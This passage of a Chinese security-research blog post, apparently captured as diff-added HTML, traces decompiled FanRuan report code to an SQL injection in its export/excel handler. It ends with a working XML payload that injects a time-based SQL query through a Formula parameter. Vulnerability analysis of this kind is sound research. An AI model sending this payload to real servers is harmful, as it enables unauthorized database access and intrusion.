&#123;<br>                           <span class="hljs-keyword">if</span> (this.deep &lt;= cur_deep) &#123;<br>                               --this.deep;<br>                               <span class="hljs-keyword">break</span>;<br>                           &#125;<br><br>                           --this.deep;<br>                       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (this.currentEvent.isCharacters() &amp;&amp; (this.currentEvent.asCharacters().isCData() || !this.currentEvent.asCharacters().getData().equals(<span class="hljs-string">&quot;\n&quot;</span>))) &#123;<br>                           this.state = <span class="hljs-number">2</span>;<br>                           xmlObject.readXML(this);<br>                           this.state = <span class="hljs-number">-1</span>;<br>                       &#125;<br>                   &#125;<br><br>                   <span class="hljs-keyword">return</span> xmlObject;<br>               &#125; catch (XMLStreamException var4) &#123;<br>                   XMLStreamException xml_e = var4;<br>                   throw new RuntimeException(xml_e);<br>               &#125;<br>           &#125;<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//Parameter</span><br>public <span class="hljs-type">void</span> <span class="hljs-title function_">readXML</span><span class="hljs-params">(XMLableReader var1)</span> &#123;<br>    <span class="hljs-keyword">if</span> (var1.isChildNode()) &#123;  <span class="hljs-comment">// 1. 确保当前节点是元素节点（而非文本、属性等）</span><br>        String var3 = var1.getTagName(); <span class="hljs-comment">// 2. 获取当前元素的标签名</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;Object&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;O&quot;</span>.equals(var3)) &#123; <span class="hljs-comment">// 3. 如果不是 &lt;Object&gt; 或 &lt;O&gt; 标签</span><br>            String var2;<br>            <span class="hljs-comment">// 4. 如果是 &lt;Attributes&gt; 标签，且存在 name 属性</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Attributes&quot;</span>.equals(var3) &amp;&amp; (var2 = var1.getAttrAsString(<span class="hljs-string">&quot;name&quot;</span>, (String)null)) != null) &#123;<br>                this.setName(var2); <span class="hljs-comment">// 5. 设置对象的名称</span><br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// 6. 如果是 &lt;Object&gt; 或 &lt;O&gt; 标签，则读取其内容作为值</span><br>            Object var4 = GeneralXMLTools.readObject(var1);<br>            this.setValue(var4);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>如果标签名是 <code>&quot;Object&quot;</code>​ 或 <code>&quot;O&quot;</code>​，则调用 <code>GeneralXMLTools.readObject(var1)</code> 从该标签中读取一个 Java 对象，如果没有这两个标签，则只从<Attributes>标签中获取name，作为xml对象的名称。父类解析的xml大概长这样</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;Parameter&gt;<br>    &lt;Attributes name=<span class="hljs-string">&quot;city&quot;</span>/&gt;<br>    &lt;Object&gt;Beijing&lt;/Object&gt;<br>&lt;/Parameter&gt;<br></code></pre></td></tr></table></figure>
+
+<p>跟进<code>readObject</code>​，这里用于从 XMLableReader 中读取一个对象。它根据 XML 元素上的属性t来决定对象的类型，然后调用 <code>Object_Tokenizer.tokenizerObject</code> 来实际构建对象</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//GeneralXMLTools</span><br>public <span class="hljs-type">static</span> Object <span class="hljs-title function_">readObject</span><span class="hljs-params">(XMLableReader var0, boolean var1)</span> &#123;<br>        String var2 = <span class="hljs-string">&quot;String&quot;</span>;<br>        String var3;<br>        <span class="hljs-keyword">if</span> ((var3 = var0.getAttrAsString(<span class="hljs-string">&quot;t&quot;</span>, (String)null)) != null) &#123;<br>            var2 = var3;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> Object_Tokenizer.tokenizerObject(var0, var1, var2, (ThreadLocal)null);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里负责根据 XML 中的类型标识将 XML 内容解析为相应的 Java 对象，上面不是传进来一个t吗，举个例子，如果我传入的xml标签里面有这样一段</p>
+<p>​<code>&lt;Object t=&quot;I&quot;&gt;25&lt;/Object&gt;</code>​，当解析到该元素时，<code>tokenizerObject</code>​ 会被调用，<code>var3</code>​ 为 <code>I</code>​，然后进入 <code>Integer</code> 分支，返回一个int类型的25，并存入</p>
+<p>​<code>parameters</code>数组</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//BaseObjectTokenizer</span><br>   public Object <span class="hljs-title function_">tokenizerObject</span><span class="hljs-params">(XMLableReader var1, boolean var2, String var3, ThreadLocal var4)</span> &#123;<br>       <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;NULL&quot;</span>.equals(var3)) &#123;<br>           <span class="hljs-keyword">return</span> Primitive.<span class="hljs-literal">NULL</span>;<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (this.isString(var3)) &#123;<br>           <span class="hljs-keyword">return</span> this.getDefaultByString(var1, var2);<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;D&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;Double&quot;</span>.equals(var3)) &#123;<br>           <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;B&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;Boolean&quot;</span>.equals(var3)) &#123;<br>               <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;I&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;Inteter&quot;</span>.equals(var3)) &#123;<br>                   <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;L&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;Long&quot;</span>.equals(var3)) &#123;<br>                       <span class="hljs-keyword">if</span> (!<span class="hljs-string">&quot;F&quot;</span>.equals(var3) &amp;&amp; !<span class="hljs-string">&quot;Float&quot;</span>.equals(var3)) &#123;<br>                           <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;BigInteger&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> new BigInteger(GeneralXMLTools.elementValue(var1));<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;BigDecimal&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> new BigDecimal(GeneralXMLTools.elementValue(var1));<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Date&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> DateUtils.object2Date(GeneralXMLTools.elementValue(var1), <span class="hljs-literal">true</span>);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;FARRAY&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> var1.readXMLObject(new FArray());<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;RFormula&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getRFormula(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Formula&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getFormula(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;ScriptFormula&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getScriptFormula(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;WidgetName&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getWidgetName(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Image&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getImage(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Parameter&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> StableXMLUtils.readParameter(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Attachment&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> AttachmentSource.getAttachment(GeneralXMLTools.elementValue(var1));<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Attachments&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getAttachments(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;Encrypt&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> new Decrypt(GeneralXMLTools.elementValue(var1), <span class="hljs-string">&quot;655&quot;</span>);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;PCOBJ&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getPageCalObj(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;XMLable&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getXMLable(var1);<br>                           &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;A&quot;</span>.equals(var3)) &#123;<br>                               <span class="hljs-keyword">return</span> this.getA(var1);<br>                           &#125; <span class="hljs-keyword">else</span> &#123;<br>                               <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;AA&quot;</span>.equals(var3) ? this.getAA(var1) : null;<br>                           &#125;<br>                       &#125; <span class="hljs-keyword">else</span> &#123;<br>                           <span class="hljs-keyword">return</span> Float.valueOf(GeneralXMLTools.elementValue(var1));<br>                       &#125;<br>                   &#125; <span class="hljs-keyword">else</span> &#123;<br>                       <span class="hljs-keyword">return</span> Long.valueOf(GeneralXMLTools.elementValue(var1));<br>                   &#125;<br>               &#125; <span class="hljs-keyword">else</span> &#123;<br>                   <span class="hljs-keyword">return</span> Integer.valueOf(GeneralXMLTools.elementValue(var1));<br>               &#125;<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">return</span> Boolean.valueOf(GeneralXMLTools.elementValue(var1));<br>           &#125;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">return</span> this.getDouble(var1);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>分析到这里就差不多了解xml的大概结构了，总结一下：</p>
+<ol>
+<li>​<code>getEntity</code>​主要用于解析请求包中的<code>params</code>​传入的xml，获取<code>LargeDatasetExcelExportJavaScript</code>​，这个类的<code>colNamesMap</code>​，<code>dsName</code>​，<code>filename</code>从xml中解析获取，均可控</li>
+<li>​<code>LargeDatasetExcelExportJavaScript</code>​还调用了其父类的readXML方法，获取了<code>Parameter</code>​对象，并存入了<code>Parameters</code>​数组，<code>Parameter</code>对象的数据类型和参数也可控</li>
+</ol>
+<p><img src="/assets/image-20260317155349-o6xp3es.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/assets/image-20260317155517-pf647g4.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>例如，我们传入了这样一个xml，那么通过<code>getEntity</code>​，我们将得到一个 <code>LargeDatasetExcelExportJavaScript</code> 对象，包含：</p>
+<ul>
+<li>​<code>fileName = &quot;Ch4nge&quot;</code></li>
+<li>​<code>dsName = &quot;test&quot;</code></li>
+<li>​<code>colNames = &#123;&#125;</code></li>
+<li>​<code>parameters</code>​包含一个<code>name=&quot;city&quot;</code>​ 和 <code>value=25（int）</code>的Parameter对象</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//传入的xml</span><br>&lt;LargeDatasetExcelExportJS exportFileName=<span class="hljs-string">&quot;Ch4nge&quot;</span> dsName=<span class="hljs-string">&quot;test&quot;</span> colNames=<span class="hljs-string">&#x27;&#123;&#125;&#x27;</span> /&gt;<br>&lt;Parameters&gt;<br>	&lt;Parameter&gt;<br>	    &lt;Attributes name=<span class="hljs-string">&quot;city&quot;</span>/&gt;<br>	    &lt;Object t=<span class="hljs-string">&quot;I&quot;</span>&gt;<span class="hljs-number">25</span>&lt;/Object&gt;<br>	&lt;/Parameter&gt;<br>&lt;Parameters&gt;<br></code></pre></td></tr></table></figure>
+
+<h2 id="进一步利用"><a href="#进一步利用" class="headerlink" title="进一步利用"></a>进一步利用</h2><p>回到initCreator，前面解析完xml后，会分别检查xml解析<code>LargeDatasetExcelExportJavaScript</code>对象的FileName和DsName，其中DsName不能为空，不然会抛出异常，另外还会检查一下SessionID，存到var11中，接着一股脑放入dealParam这个方法中处理</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//LargeDatasetExcelExportHandler</span><br>   private WorkbookDataCreator <span class="hljs-title function_">initCreator</span><span class="hljs-params">(Calculator var1, HttpServletRequest var2, HttpServletResponse var3, TemplateSessionIDInfo var4)</span> throws Exception &#123;<br>       String var5 = WebUtils.getHTTPRequestParameter(var2, <span class="hljs-string">&quot;__parameters__&quot;</span>);	<span class="hljs-comment">//传入参数__parameters__，不重要可以为空</span><br>       Map var6 = this.getParamsMap(var5);		<br>       LargeDatasetExcelExportJavaScript var7 = this.getEntity(var2);  <span class="hljs-comment">//通过params传入xml，解析后返回LargeDatasetExcelExportJavaScript对象</span><br>       String var8 = var7.getFileName();<br>       String var9 = var7.getDsName();<br>       LinkedHashMap var10 = var7.getColNamesMap();<br>       DirectExcelExportModel var11 = new DirectExcelExportModel();<br>       TableDataSource var12 = var4.getTableDataSource();<br>       <span class="hljs-keyword">if</span> (StringUtils.isNotEmpty(var8) &amp;&amp; var8.startsWith(<span class="hljs-string">&quot;=$&quot;</span>)) &#123;<br>           var8 = (String)var6.get(<span class="hljs-string">&quot;__filename__&quot;</span>);<br>       &#125;<br><br>       <span class="hljs-keyword">if</span> (StringUtils.isEmpty(var8)) &#123;<br>           var8 = getDefaultFileName(var2, var4, var9);<br>       &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (var8.endsWith(<span class="hljs-string">&quot;.xlsx&quot;</span>)) &#123;<br>           var8 = var8.substring(<span class="hljs-number">0</span>, var8.lastIndexOf(<span class="hljs-string">&quot;.xlsx&quot;</span>));<br>       &#125;<br><br>       this.setRes(var3, Browser.resolve(var2).getEncodedFileName4Download(var8));<br>       var11.setDataSource(var12);<br>       var11.setSessionID(var4.getSessionID());<br>       <span class="hljs-keyword">if</span> (StringUtils.isEmpty(var9)) &#123;  <span class="hljs-comment">//var9不能为空，所以xml中DsName不能为空</span><br>           throw new Exception(<span class="hljs-string">&quot;No datasource name specified for exportation.&quot;</span>);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           var11.setDsName(var9);<br>           this.dealParam(var11, var1, var7, var2, var4, var6);<br>           <span class="hljs-keyword">if</span> (!var10.isEmpty()) &#123;<br>               var11.setColNamesMap(var10);<br>           &#125;<br><br>           <span class="hljs-keyword">return</span> WorkbookDataCreator.build(var11);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure>
+
+<p>​<code>dealParam</code>​ 的核心作用是将多个来源的参数值合并，并处理公式和占位符，最终生成一个统一的参数映射。参数优先级为：<code>__parameters__</code>​ &gt; <code>functionParams</code> 中的值 &gt; xml解析Parameter中的值，为了不让Parameter被覆盖，前两个参数可以设置为空</p>
+<p>该漏洞的sink点在Calculator#evalValue这里，通过传入<code>Formula</code>​类型的Parameter对象利用其执行<code>sql(...)</code>函数去RCE</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c">private <span class="hljs-type">void</span> <span class="hljs-title function_">dealParam</span><span class="hljs-params">(DirectExcelExportModel var1, Calculator var2, LargeDatasetExcelExportJavaScript var3, HttpServletRequest var4, TemplateSessionIDInfo var5, Map&lt;String, Object&gt; var6)</span> throws UtilEvalError &#123;<br>    String var7 = WebUtils.getHTTPRequestParameter(var4, <span class="hljs-string">&quot;functionParams&quot;</span>);		<span class="hljs-comment">//接收functionParams参数</span><br>    Map var8 = this.getParamsMap(var7);<br>    ParameterProvider[] var9 = var3.getParameters();  <span class="hljs-comment">//获得LargeDatasetExcelExportJavaScript模板中定义的ParameterProvider对象</span><br>    ParameterMapNameSpace var10 = ParameterMapNameSpace.create(var9);<br>    NameSpace var11 = SessionIDInfo.asNameSpace(var5.getSessionID());<br>    this.addNameSpace(var4, var2, var11, var10);<br>    Parameter[] var12 = Parameter.providers2Parameter(var9);  <span class="hljs-comment">//将 ParameterProvider 数组转换为 Parameter 数组</span><br>    LinkedHashMap var13 = new LinkedHashMap(<span class="hljs-number">16</span>);<br>    Parameter[] var14 = var12;<br>    <span class="hljs-type">int</span> var15 = var12.length;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> var16 = <span class="hljs-number">0</span>; var16 &lt; var15; ++var16) &#123;  <span class="hljs-comment">//遍历 Parameter 数组，处理每个 Parameter </span><br>        Parameter var17 = var14[var16];<br>        Object var18 = var6.get(var17.getName());<br>        <span class="hljs-keyword">if</span> (var18 != null) &#123;  <span class="hljs-comment">//__parameters__需要为空，如果用户在 __parameters__ 中提供了 Parameter 的值，则直接使用该值，不再处理其他来源</span><br>            var13.put(var17.getName(), var18);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            JSONObject var19 = (JSONObject)var8.get(var17.getName());<br>            <span class="hljs-keyword">if</span> (var19 == null) &#123; <span class="hljs-comment">//functionParams需要为空，如果用户在functionParams中提供了 Parameter 的值，则直接使用该值，不再处理其他来源</span><br>                Object var25;<br>                <span class="hljs-keyword">if</span> (var17.getValue() instanceof Formula) &#123;<br>                    var25 = var2.evalValue(String.valueOf(var17.getValue()));  <span class="hljs-comment">//调用Calculator.evalValue,参数为 Parameter </span><br>                    var13.put(var17.getName(), var25);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    var25 = var17.getValue();<br>                    var13.put(var17.getName(), var25);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                String var20 = String.valueOf(var17.getValue());<br>                Map var21 = var19.toMap();<br><br>                Map.Entry var23;<br>                <span class="hljs-keyword">for</span>(Iterator var22 = var21.entrySet().iterator(); var22.hasNext(); var20 = var20.replaceAll(<span class="hljs-string">&quot;\\$&quot;</span> + (String)var23.getKey(), <span class="hljs-string">&quot;\&quot;&quot;</span> + var23.getValue().toString() + <span class="hljs-string">&quot;\&quot;&quot;</span>)) &#123;<br>                    var23 = (Map.Entry)var22.next();<br>                &#125;<br><br>                Object var24 = var2.evalValue(var20);<br>                var13.put(var17.getName(), var24);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    var1.setParameters(this.dealWithAuthParam(var13, var5));<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最终的payload为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;R&gt;<br>    &lt;LargeDatasetExcelExportJS exportFileName=<span class="hljs-string">&quot;Ch4nge&quot;</span> dsName=<span class="hljs-string">&quot;ds1&quot;</span> colNames=<span class="hljs-string">&quot;&#123;&#125;&quot;</span> exportFormat=<span class="hljs-string">&quot;excel&quot;</span> encodeFormat=<span class="hljs-string">&quot;UTF-8&quot;</span>/&gt;<br>    &lt;Parameters&gt;<br>        &lt;Parameter&gt;<br>            &lt;Attributes name=<span class="hljs-string">&quot;1&quot;</span>&gt;&lt;/Attributes&gt;<br>            &lt;Object t=<span class="hljs-string">&quot;Formula&quot;</span>&gt;<br>                &lt;Attributes&gt;sql(<span class="hljs-string">&#x27;FRDemo&#x27;</span>, DECODE(<span class="hljs-string">&#x27;SELECT%20IF%281%3D1%2C%20SLEEP%285%29%2C%200%29&#x27;</span>), <span class="hljs-number">1</span>, <span class="hljs-number">1</span>)&lt;/Attributes&gt;<br>            &lt;/Object&gt;<br>        &lt;/Parameter&gt;<br>    &lt;/Parameters&gt;<br>&lt;/R&gt;<br></code></pre></td></tr></table></figure>
+
+<p><img src="/assets/image-20260317175401-wpjp4he.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="/assets/image-20260317175444-4o2jw36.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>ps：seesionid的获取将另开一篇文章</p>
+<p>另一种思路，不构建Formula对象，使用占位符来替换走第二个var2.evalValue</p>
+<p><img src="/assets/20251219111825-6164d386-dc89-1-20260317172554-al5itw8.png" srcset="/img/loading.gif" lazyload alt="20251219111825-6164d386-dc89-1"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90898">https://xz.aliyun.com/news/90898</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/90947">https://xz.aliyun.com/news/90947</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="category-chain-item">代码审计</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" class="print-no-link">#安全研究</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>帆软报表 export／excel SQL注入分析（上）</div>
+      <div>http://example.com/2026/02/16/帆软报表 export／excel SQL注入分析（上）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>John Doe</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年2月16日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/01/28/0x05-%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/" title="黄金票据和白银票据">
+                        <span class="hidden-mobile">黄金票据和白银票据</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
